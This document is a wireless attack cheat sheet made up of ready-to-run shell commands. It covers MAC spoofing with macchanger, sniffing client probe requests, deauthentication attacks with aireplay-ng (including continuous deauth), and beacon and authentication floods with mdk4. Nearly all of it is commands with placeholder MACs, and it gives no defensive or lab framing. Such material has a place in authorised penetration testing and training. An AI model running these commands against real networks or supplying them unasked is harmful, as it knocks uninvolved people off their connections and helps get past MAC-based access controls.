# MAC Spoofing & Client Attacks

## MAC Address Spoofing
```bash
# Check current MAC
macchanger -s wlan0

# Random MAC
sudo macchanger -r wlan0

# Specific MAC
sudo macchanger -m AA:BB:CC:DD:EE:FF wlan0

# Bring interface down first (required)
sudo ifconfig wlan0 down
sudo macchanger -r wlan0
sudo ifconfig wlan0 up
```

## Probe Request Sniffing
Clients broadcast probe requests looking for previously connected networks.
```bash
# Capture probe requests (reveals networks clients connect to)
sudo airodump-ng wlan0mon --probe

# With tshark
sudo tshark -i wlan0mon -Y "wlan.fc.type_subtype == 4"
```

## Deauthentication Attack (Client DoS)
```bash
# Deauth all clients from AP
sudo aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF wlan0mon

# Deauth specific client
sudo aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF -c CLIENT_MAC wlan0mon

# Continuous deauth
sudo aireplay-ng -0 0 -a AA:BB:CC:DD:EE:FF wlan0mon
```

## Beacon Flood Attack
Floods the area with fake AP beacons (confuses scanners, DoS).
```bash
# Using mdk4
sudo mdk4 wlan0mon b -c 6

# With specific SSID list
sudo mdk4 wlan0mon b -c 6 -f ssid_list.txt
```

## Authentication Flood (Client Connection DoS)
```bash
# Flood AP with auth requests (DoS)
sudo mdk4 wlan0mon a -i AA:BB:CC:DD:EE:FF
```
